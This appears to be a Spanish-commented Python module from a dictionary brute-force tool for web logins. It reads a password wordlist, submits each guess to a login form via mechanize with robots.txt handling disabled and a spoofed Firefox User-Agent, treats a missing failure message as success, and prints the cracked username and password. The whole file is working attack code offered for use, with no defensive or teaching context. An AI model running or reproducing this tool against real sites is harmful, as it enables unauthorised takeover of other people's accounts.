import mechanize
from colorama import init,Fore
import parametros as params
from re import search
from time import sleep

init()

# estados
deteniendo = False
esperando = False

def generador(diccionario):
    
    with open(diccionario,'r') as arch:
        try:
            for linea in arch:
            
                yield linea.strip()
        except UnicodeDecodeError:
            print(Fore.WHITE+f'error en linea: {linea.strip()}')
            yield None
        except Exception as e:
        
            print(Fore.RED+f'\nocurrio un error al leer el dicionario: {e}')
            yield 'error'


def leer_dic(nombre):
    try:
        with open(nombre,'r') as arch:
            return str(arch.read()).strip()
        
    except UnicodeDecodeError as e:
        print(Fore.RED+f'\nerror de decodificacion del diccionario: {e}')
    
    except Exception as e:
        
        print(Fore.RED+f'\nocurrio un error al leer el dicionario: {e}')

def fb(url_login,usuario,c_usuario,c_contr,contr_,n):
    global deteniendo
    global esperando
    #url_login --> url del login de pagina web cuando se envia un dato invalido
    #usuario --> si conozco el usuario se almacena aca
    #c_contr --> atriqueta name de html de contraseña
    #c_usuario --> atriqueta name de html de usuario
    #n --> numero de formulario
    
    try:
        web = mechanize.Browser()
        encabezado = [
            ('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:70.0) Gecko/20100101 Firefox/70.0')
        ]

        web.set_handle_robots(False)
        web.addheaders = encabezado
        sitio = web.open(url_login)

        if sitio.code == 200:
            

            web.select_form(nr=n)
            web[c_usuario] = usuario
            web[c_contr] = contr_
            pag2= web.submit()
            html = pag2.get_data().decode()
                
            #si conozco el usuario
            if search(params.param.msg,html) == None:
                if params.param.usuario != None:
                    print(Fore.GREEN+f'\ncontraseña encontrada: {contr_}\n')
                else:
                    print(Fore.GREEN+f'\n cuenta encontrada:\n\n usuario:{usuario}\n contraseña:{contr_}\n')
                deteniendo = True

                exit()
            else:
                if not deteniendo:
                    print(Fore.RED+f'valor invalido para: {usuario} ,{contr_}')
                    
        else:
            print(Fore.RED+'el sitio es inaccesible')    
                


        web.close()
    except (mechanize.HTTPError, mechanize.URLError):
        esperando = True
        print(Fore.WHITE+'reconectando...')
        sleep(1)
        esperando = False
    except Exception as e:
        if not deteniendo:
            print(Fore.WHITE+f'error: {e}')
            deteniendo = True